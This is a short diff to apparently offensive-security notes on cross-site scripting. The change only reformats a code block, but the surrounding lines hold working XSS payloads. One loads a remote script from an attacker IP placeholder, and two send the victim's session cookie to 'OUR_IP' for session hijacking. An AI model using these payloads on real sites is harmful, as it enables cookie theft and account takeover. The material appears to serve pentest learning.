@@ -37,7 +37,9 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 ```
 ### The Session Hijack
 We need code to send the session cookie back to our listener(nc or php(same as above))
-More Examples from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)```javascript
+More Examples from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)
+
+```javascript
 document.location='http://OUR_IP/index.php?c='+document.cookie;
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
